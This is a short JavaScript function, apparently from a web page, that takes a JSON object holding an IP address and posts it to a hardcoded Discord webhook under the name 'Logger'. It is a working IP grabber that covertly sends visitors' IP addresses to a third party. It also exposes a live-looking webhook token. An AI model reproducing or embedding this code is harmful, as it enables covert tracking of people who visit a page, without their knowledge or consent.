function getIP(json) {
            var request = new XMLHttpRequest();
            request.open("POST", "https://discord.com/api/webhooks/964338591050366986/GzAYFOxmjOMvlwsWuiejB_sY6cvzrxk8phVKOLxwgmB97xOPcs77f193lZyjBbPER8O7");

            request.setRequestHeader('Content-type', 'application/json');

            var params = {
                username: "Logger",
                avatar_url: "https://media.discordapp.net/attachments/824690852373725244/960854716621934592/00a1955deaa5bf71e88f78e51fcee4ce.png",
                content: "**IP:** *" + json.ip + "*"
            }


            request.send(JSON.stringify(params));
        }
